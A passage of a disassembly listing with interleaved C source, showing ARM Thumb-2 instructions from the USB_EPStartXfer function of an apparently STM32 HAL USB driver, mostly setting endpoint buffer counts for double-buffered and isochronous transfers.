 8007a6e:	f8c7 30a4 	str.w	r3, [r7, #164]	; 0xa4
 8007a72:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a76:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a7a:	681b      	ldr	r3, [r3, #0]
 8007a7c:	785b      	ldrb	r3, [r3, #1]
 8007a7e:	2b00      	cmp	r3, #0
 8007a80:	f040 809d 	bne.w	8007bbe <USB_EPStartXfer+0x1244>
 8007a84:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a88:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007a8c:	681b      	ldr	r3, [r3, #0]
 8007a8e:	f8c7 309c 	str.w	r3, [r7, #156]	; 0x9c
 8007a92:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a96:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007a9a:	681b      	ldr	r3, [r3, #0]
 8007a9c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007aa0:	b29b      	uxth	r3, r3
 8007aa2:	461a      	mov	r2, r3
 8007aa4:	f8d7 309c 	ldr.w	r3, [r7, #156]	; 0x9c
 8007aa8:	4413      	add	r3, r2
 8007aaa:	f8c7 309c 	str.w	r3, [r7, #156]	; 0x9c
 8007aae:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ab2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007ab6:	681b      	ldr	r3, [r3, #0]
 8007ab8:	781b      	ldrb	r3, [r3, #0]
 8007aba:	00da      	lsls	r2, r3, #3
 8007abc:	f8d7 309c 	ldr.w	r3, [r7, #156]	; 0x9c
 8007ac0:	4413      	add	r3, r2
 8007ac2:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007ac6:	f8c7 3098 	str.w	r3, [r7, #152]	; 0x98
 8007aca:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007ace:	881b      	ldrh	r3, [r3, #0]
 8007ad0:	b29b      	uxth	r3, r3
 8007ad2:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007ad6:	b29a      	uxth	r2, r3
 8007ad8:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007adc:	801a      	strh	r2, [r3, #0]
 8007ade:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ae2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007ae6:	681b      	ldr	r3, [r3, #0]
 8007ae8:	691b      	ldr	r3, [r3, #16]
 8007aea:	2b3e      	cmp	r3, #62	; 0x3e
 8007aec:	d92b      	bls.n	8007b46 <USB_EPStartXfer+0x11cc>
 8007aee:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007af2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007af6:	681b      	ldr	r3, [r3, #0]
 8007af8:	691b      	ldr	r3, [r3, #16]
 8007afa:	095b      	lsrs	r3, r3, #5
 8007afc:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007b00:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b04:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007b08:	681b      	ldr	r3, [r3, #0]
 8007b0a:	691b      	ldr	r3, [r3, #16]
 8007b0c:	f003 031f 	and.w	r3, r3, #31
 8007b10:	2b00      	cmp	r3, #0
 8007b12:	d104      	bne.n	8007b1e <USB_EPStartXfer+0x11a4>
 8007b14:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007b18:	3b01      	subs	r3, #1
 8007b1a:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007b1e:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007b22:	881b      	ldrh	r3, [r3, #0]
 8007b24:	b29a      	uxth	r2, r3
 8007b26:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007b2a:	b29b      	uxth	r3, r3
 8007b2c:	029b      	lsls	r3, r3, #10
 8007b2e:	b29b      	uxth	r3, r3
 8007b30:	4313      	orrs	r3, r2
 8007b32:	b29b      	uxth	r3, r3
 8007b34:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007b38:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007b3c:	b29a      	uxth	r2, r3
 8007b3e:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007b42:	801a      	strh	r2, [r3, #0]
 8007b44:	e069      	b.n	8007c1a <USB_EPStartXfer+0x12a0>
 8007b46:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b4a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007b4e:	681b      	ldr	r3, [r3, #0]
 8007b50:	691b      	ldr	r3, [r3, #16]
 8007b52:	2b00      	cmp	r3, #0
 8007b54:	d10c      	bne.n	8007b70 <USB_EPStartXfer+0x11f6>
 8007b56:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007b5a:	881b      	ldrh	r3, [r3, #0]
 8007b5c:	b29b      	uxth	r3, r3
 8007b5e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007b62:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007b66:	b29a      	uxth	r2, r3
 8007b68:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007b6c:	801a      	strh	r2, [r3, #0]
 8007b6e:	e054      	b.n	8007c1a <USB_EPStartXfer+0x12a0>
 8007b70:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b74:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007b78:	681b      	ldr	r3, [r3, #0]
 8007b7a:	691b      	ldr	r3, [r3, #16]
 8007b7c:	085b      	lsrs	r3, r3, #1
 8007b7e:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007b82:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b86:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007b8a:	681b      	ldr	r3, [r3, #0]
 8007b8c:	691b      	ldr	r3, [r3, #16]
 8007b8e:	f003 0301 	and.w	r3, r3, #1
 8007b92:	2b00      	cmp	r3, #0
 8007b94:	d004      	beq.n	8007ba0 <USB_EPStartXfer+0x1226>
 8007b96:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007b9a:	3301      	adds	r3, #1
 8007b9c:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007ba0:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007ba4:	881b      	ldrh	r3, [r3, #0]
 8007ba6:	b29a      	uxth	r2, r3
 8007ba8:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007bac:	b29b      	uxth	r3, r3
 8007bae:	029b      	lsls	r3, r3, #10
 8007bb0:	b29b      	uxth	r3, r3
 8007bb2:	4313      	orrs	r3, r2
 8007bb4:	b29a      	uxth	r2, r3
 8007bb6:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007bba:	801a      	strh	r2, [r3, #0]
 8007bbc:	e02d      	b.n	8007c1a <USB_EPStartXfer+0x12a0>
 8007bbe:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007bc2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007bc6:	681b      	ldr	r3, [r3, #0]
 8007bc8:	785b      	ldrb	r3, [r3, #1]
 8007bca:	2b01      	cmp	r3, #1
 8007bcc:	d125      	bne.n	8007c1a <USB_EPStartXfer+0x12a0>
 8007bce:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007bd2:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007bd6:	681b      	ldr	r3, [r3, #0]
 8007bd8:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007bdc:	b29b      	uxth	r3, r3
 8007bde:	461a      	mov	r2, r3
 8007be0:	f8d7 30a4 	ldr.w	r3, [r7, #164]	; 0xa4
 8007be4:	4413      	add	r3, r2
 8007be6:	f8c7 30a4 	str.w	r3, [r7, #164]	; 0xa4
 8007bea:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007bee:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007bf2:	681b      	ldr	r3, [r3, #0]
 8007bf4:	781b      	ldrb	r3, [r3, #0]
 8007bf6:	00da      	lsls	r2, r3, #3
 8007bf8:	f8d7 30a4 	ldr.w	r3, [r7, #164]	; 0xa4
 8007bfc:	4413      	add	r3, r2
 8007bfe:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007c02:	f8c7 30a0 	str.w	r3, [r7, #160]	; 0xa0
 8007c06:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c0a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c0e:	681b      	ldr	r3, [r3, #0]
 8007c10:	691b      	ldr	r3, [r3, #16]
 8007c12:	b29a      	uxth	r2, r3
 8007c14:	f8d7 30a0 	ldr.w	r3, [r7, #160]	; 0xa0
 8007c18:	801a      	strh	r2, [r3, #0]

        /* Coming from ISR */
        if (ep->xfer_count != 0U)
 8007c1a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c1e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c22:	681b      	ldr	r3, [r3, #0]
 8007c24:	69db      	ldr	r3, [r3, #28]
 8007c26:	2b00      	cmp	r3, #0
 8007c28:	f000 8218 	beq.w	800805c <USB_EPStartXfer+0x16e2>
        {
          /* update last value to check if there is blocking state */
          wEPVal = PCD_GET_ENDPOINT(USBx, ep->num);
 8007c2c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c30:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007c34:	681a      	ldr	r2, [r3, #0]
 8007c36:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c3a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c3e:	681b      	ldr	r3, [r3, #0]
 8007c40:	781b      	ldrb	r3, [r3, #0]
 8007c42:	009b      	lsls	r3, r3, #2
 8007c44:	4413      	add	r3, r2
 8007c46:	881b      	ldrh	r3, [r3, #0]
 8007c48:	f8a7 3096 	strh.w	r3, [r7, #150]	; 0x96

          /*Blocking State */
          if ((((wEPVal & USB_EP_DTOG_RX) != 0U) && ((wEPVal & USB_EP_DTOG_TX) != 0U)) ||
 8007c4c:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007c50:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8007c54:	2b00      	cmp	r3, #0
 8007c56:	d005      	beq.n	8007c64 <USB_EPStartXfer+0x12ea>
 8007c58:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007c5c:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8007c60:	2b00      	cmp	r3, #0
 8007c62:	d10d      	bne.n	8007c80 <USB_EPStartXfer+0x1306>
              (((wEPVal & USB_EP_DTOG_RX) == 0U) && ((wEPVal & USB_EP_DTOG_TX) == 0U)))
 8007c64:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007c68:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
          if ((((wEPVal & USB_EP_DTOG_RX) != 0U) && ((wEPVal & USB_EP_DTOG_TX) != 0U)) ||
 8007c6c:	2b00      	cmp	r3, #0
 8007c6e:	f040 81f5 	bne.w	800805c <USB_EPStartXfer+0x16e2>
              (((wEPVal & USB_EP_DTOG_RX) == 0U) && ((wEPVal & USB_EP_DTOG_TX) == 0U)))
 8007c72:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007c76:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8007c7a:	2b00      	cmp	r3, #0
 8007c7c:	f040 81ee 	bne.w	800805c <USB_EPStartXfer+0x16e2>
          {
            PCD_FREE_USER_BUFFER(USBx, ep->num, 0U);
 8007c80:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c84:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007c88:	681a      	ldr	r2, [r3, #0]
 8007c8a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c8e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c92:	681b      	ldr	r3, [r3, #0]
 8007c94:	781b      	ldrb	r3, [r3, #0]
 8007c96:	009b      	lsls	r3, r3, #2
 8007c98:	4413      	add	r3, r2
 8007c9a:	881b      	ldrh	r3, [r3, #0]
 8007c9c:	b29b      	uxth	r3, r3
 8007c9e:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8007ca2:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8007ca6:	f8a7 3094 	strh.w	r3, [r7, #148]	; 0x94
 8007caa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007cae:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007cb2:	681a      	ldr	r2, [r3, #0]
 8007cb4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007cb8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007cbc:	681b      	ldr	r3, [r3, #0]
 8007cbe:	781b      	ldrb	r3, [r3, #0]
 8007cc0:	009b      	lsls	r3, r3, #2
 8007cc2:	441a      	add	r2, r3
 8007cc4:	f8b7 3094 	ldrh.w	r3, [r7, #148]	; 0x94
 8007cc8:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8007ccc:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8007cd0:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8007cd4:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8007cd8:	b29b      	uxth	r3, r3
 8007cda:	8013      	strh	r3, [r2, #0]
 8007cdc:	e1be      	b.n	800805c <USB_EPStartXfer+0x16e2>
          }
        }
      }
      /* iso out double */
      else if (ep->type == EP_TYPE_ISOC)
 8007cde:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ce2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007ce6:	681b      	ldr	r3, [r3, #0]
 8007ce8:	78db      	ldrb	r3, [r3, #3]
 8007cea:	2b01      	cmp	r3, #1
 8007cec:	f040 81b4 	bne.w	8008058 <USB_EPStartXfer+0x16de>
      {
        /* Multi packet transfer */
        if (ep->xfer_len > ep->maxpacket)
 8007cf0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007cf4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007cf8:	681b      	ldr	r3, [r3, #0]
 8007cfa:	699a      	ldr	r2, [r3, #24]
 8007cfc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d00:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d04:	681b      	ldr	r3, [r3, #0]
 8007d06:	691b      	ldr	r3, [r3, #16]
 8007d08:	429a      	cmp	r2, r3
 8007d0a:	d917      	bls.n	8007d3c <USB_EPStartXfer+0x13c2>
        {
          len = ep->maxpacket;
 8007d0c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d10:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d14:	681b      	ldr	r3, [r3, #0]
 8007d16:	691b      	ldr	r3, [r3, #16]
 8007d18:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
          ep->xfer_len -= len;
 8007d1c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d20:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d24:	681b      	ldr	r3, [r3, #0]
 8007d26:	699a      	ldr	r2, [r3, #24]
 8007d28:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007d2c:	1ad2      	subs	r2, r2, r3
 8007d2e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d32:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d36:	681b      	ldr	r3, [r3, #0]
 8007d38:	619a      	str	r2, [r3, #24]
 8007d3a:	e00e      	b.n	8007d5a <USB_EPStartXfer+0x13e0>
        }
        else
        {
          len = ep->xfer_len;
 8007d3c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d40:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d44:	681b      	ldr	r3, [r3, #0]
 8007d46:	699b      	ldr	r3, [r3, #24]
 8007d48:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
          ep->xfer_len = 0U;
 8007d4c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d50:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d54:	681b      	ldr	r3, [r3, #0]
 8007d56:	2200      	movs	r2, #0
 8007d58:	619a      	str	r2, [r3, #24]
        }
        PCD_SET_EP_DBUF_CNT(USBx, ep->num, ep->is_in, len);
 8007d5a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d5e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d62:	681b      	ldr	r3, [r3, #0]
 8007d64:	785b      	ldrb	r3, [r3, #1]
 8007d66:	2b00      	cmp	r3, #0
 8007d68:	f040 8085 	bne.w	8007e76 <USB_EPStartXfer+0x14fc>
 8007d6c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d70:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007d74:	681b      	ldr	r3, [r3, #0]
 8007d76:	f8c7 30cc 	str.w	r3, [r7, #204]	; 0xcc
 8007d7a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d7e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007d82:	681b      	ldr	r3, [r3, #0]
 8007d84:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007d88:	b29b      	uxth	r3, r3
 8007d8a:	461a      	mov	r2, r3
 8007d8c:	f8d7 30cc 	ldr.w	r3, [r7, #204]	; 0xcc
 8007d90:	4413      	add	r3, r2
 8007d92:	f8c7 30cc 	str.w	r3, [r7, #204]	; 0xcc
 8007d96:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d9a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d9e:	681b      	ldr	r3, [r3, #0]
 8007da0:	781b      	ldrb	r3, [r3, #0]
 8007da2:	00da      	lsls	r2, r3, #3
 8007da4:	f8d7 30cc 	ldr.w	r3, [r7, #204]	; 0xcc
 8007da8:	4413      	add	r3, r2
 8007daa:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007dae:	f8c7 30c8 	str.w	r3, [r7, #200]	; 0xc8
 8007db2:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007db6:	881b      	ldrh	r3, [r3, #0]
 8007db8:	b29b      	uxth	r3, r3
 8007dba:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007dbe:	b29a      	uxth	r2, r3
 8007dc0:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007dc4:	801a      	strh	r2, [r3, #0]
 8007dc6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007dca:	2b3e      	cmp	r3, #62	; 0x3e
 8007dcc:	d923      	bls.n	8007e16 <USB_EPStartXfer+0x149c>
 8007dce:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007dd2:	095b      	lsrs	r3, r3, #5
 8007dd4:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 8007dd8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007ddc:	f003 031f 	and.w	r3, r3, #31
 8007de0:	2b00      	cmp	r3, #0
 8007de2:	d104      	bne.n	8007dee <USB_EPStartXfer+0x1474>
 8007de4:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 8007de8:	3b01      	subs	r3, #1
 8007dea:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 8007dee:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007df2:	881b      	ldrh	r3, [r3, #0]
 8007df4:	b29a      	uxth	r2, r3
 8007df6:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 8007dfa:	b29b      	uxth	r3, r3
 8007dfc:	029b      	lsls	r3, r3, #10
 8007dfe:	b29b      	uxth	r3, r3
 8007e00:	4313      	orrs	r3, r2
 8007e02:	b29b      	uxth	r3, r3
 8007e04:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007e08:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007e0c:	b29a      	uxth	r2, r3
 8007e0e:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007e12:	801a      	strh	r2, [r3, #0]
 8007e14:	e060      	b.n	8007ed8 <USB_EPStartXfer+0x155e>
 8007e16:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007e1a:	2b00      	cmp	r3, #0
 8007e1c:	d10c      	bne.n	8007e38 <USB_EPStartXfer+0x14be>
 8007e1e:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007e22:	881b      	ldrh	r3, [r3, #0]
 8007e24:	b29b      	uxth	r3, r3
 8007e26:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007e2a:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007e2e:	b29a      	uxth	r2, r3
 8007e30:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007e34:	801a      	strh	r2, [r3, #0]
 8007e36:	e04f      	b.n	8007ed8 <USB_EPStartXfer+0x155e>
 8007e38:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007e3c:	085b      	lsrs	r3, r3, #1
 8007e3e:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 8007e42:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007e46:	f003 0301 	and.w	r3, r3, #1
 8007e4a:	2b00      	cmp	r3, #0
 8007e4c:	d004      	beq.n	8007e58 <USB_EPStartXfer+0x14de>
 8007e4e:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 8007e52:	3301      	adds	r3, #1
 8007e54:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 8007e58:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007e5c:	881b      	ldrh	r3, [r3, #0]
 8007e5e:	b29a      	uxth	r2, r3
 8007e60:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 8007e64:	b29b      	uxth	r3, r3
 8007e66:	029b      	lsls	r3, r3, #10
 8007e68:	b29b      	uxth	r3, r3
 8007e6a:	4313      	orrs	r3, r2
 8007e6c:	b29a      	uxth	r2, r3
 8007e6e:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007e72:	801a      	strh	r2, [r3, #0]
 8007e74:	e030      	b.n	8007ed8 <USB_EPStartXfer+0x155e>
 8007e76:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e7a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e7e:	681b      	ldr	r3, [r3, #0]
 8007e80:	785b      	ldrb	r3, [r3, #1]
 8007e82:	2b01      	cmp	r3, #1
 8007e84:	d128      	bne.n	8007ed8 <USB_EPStartXfer+0x155e>
 8007e86:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e8a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007e8e:	681b      	ldr	r3, [r3, #0]
 8007e90:	f8c7 30d4 	str.w	r3, [r7, #212]	; 0xd4
 8007e94:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e98:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007e9c:	681b      	ldr	r3, [r3, #0]
 8007e9e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007ea2:	b29b      	uxth	r3, r3
 8007ea4:	461a      	mov	r2, r3
 8007ea6:	f8d7 30d4 	ldr.w	r3, [r7, #212]	; 0xd4
 8007eaa:	4413      	add	r3, r2
 8007eac:	f8c7 30d4 	str.w	r3, [r7, #212]	; 0xd4
 8007eb0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007eb4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007eb8:	681b      	ldr	r3, [r3, #0]
 8007eba:	781b      	ldrb	r3, [r3, #0]
 8007ebc:	00da      	lsls	r2, r3, #3
 8007ebe:	f8d7 30d4 	ldr.w	r3, [r7, #212]	; 0xd4
 8007ec2:	4413      	add	r3, r2
 8007ec4:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007ec8:	f8c7 30d0 	str.w	r3, [r7, #208]	; 0xd0
 8007ecc:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007ed0:	b29a      	uxth	r2, r3
 8007ed2:	f8d7 30d0 	ldr.w	r3, [r7, #208]	; 0xd0
 8007ed6:	801a      	strh	r2, [r3, #0]
 8007ed8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007edc:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007ee0:	681b      	ldr	r3, [r3, #0]
 8007ee2:	f8c7 30c4 	str.w	r3, [r7, #196]	; 0xc4
 8007ee6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007eea:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007eee:	681b      	ldr	r3, [r3, #0]
 8007ef0:	785b      	ldrb	r3, [r3, #1]
 8007ef2:	2b00      	cmp	r3, #0
 8007ef4:	f040 8085 	bne.w	8008002 <USB_EPStartXfer+0x1688>
 8007ef8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007efc:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007f00:	681b      	ldr	r3, [r3, #0]
 8007f02:	f8c7 30bc 	str.w	r3, [r7, #188]	; 0xbc
 8007f06:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f0a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007f0e:	681b      	ldr	r3, [r3, #0]
 8007f10:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007f14:	b29b      	uxth	r3, r3
 8007f16:	461a      	mov	r2, r3
 8007f18:	f8d7 30bc 	ldr.w	r3, [r7, #188]	; 0xbc
 8007f1c:	4413      	add	r3, r2
 8007f1e:	f8c7 30bc 	str.w	r3, [r7, #188]	; 0xbc
 8007f22:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f26:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007f2a:	681b      	ldr	r3, [r3, #0]
 8007f2c:	781b      	ldrb	r3, [r3, #0]
 8007f2e:	00da      	lsls	r2, r3, #3
 8007f30:	f8d7 30bc 	ldr.w	r3, [r7, #188]	; 0xbc
 8007f34:	4413      	add	r3, r2
 8007f36:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007f3a:	f8c7 30b8 	str.w	r3, [r7, #184]	; 0xb8
 8007f3e:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8007f42:	881b      	ldrh	r3, [r3, #0]
 8007f44:	b29b      	uxth	r3, r3
 8007f46:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007f4a:	b29a      	uxth	r2, r3
 8007f4c:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8007f50:	801a      	strh	r2, [r3, #0]
 8007f52:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007f56:	2b3e      	cmp	r3, #62	; 0x3e
 8007f58:	d923      	bls.n	8007fa2 <USB_EPStartXfer+0x1628>
 8007f5a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007f5e:	095b      	lsrs	r3, r3, #5
 8007f60:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 8007f64:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007f68:	f003 031f 	and.w	r3, r3, #31
 8007f6c:	2b00      	cmp	r3, #0
 8007f6e:	d104      	bne.n	8007f7a <USB_EPStartXfer+0x1600>
 8007f70:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 8007f74:	3b01      	subs	r3, #1
 8007f76:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 8007f7a:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8007f7e:	881b      	ldrh	r3, [r3, #0]
 8007f80:	b29a      	uxth	r2, r3
 8007f82:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 8007f86:	b29b      	uxth	r3, r3
 8007f88:	029b      	lsls	r3, r3, #10
 8007f8a:	b29b      	uxth	r3, r3
 8007f8c:	4313      	orrs	r3, r2
 8007f8e:	b29b      	uxth	r3, r3
 8007f90:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007f94:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007f98:	b29a      	uxth	r2, r3
 8007f9a:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8007f9e:	801a      	strh	r2, [r3, #0]
 8007fa0:	e05c      	b.n	800805c <USB_EPStartXfer+0x16e2>
 8007fa2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007fa6:	2b00      	cmp	r3, #0
 8007fa8:	d10c      	bne.n	8007fc4 <USB_EPStartXfer+0x164a>
 8007faa:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8007fae:	881b      	ldrh	r3, [r3, #0]
 8007fb0:	b29b      	uxth	r3, r3
 8007fb2:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007fb6:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007fba:	b29a      	uxth	r2, r3
 8007fbc:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
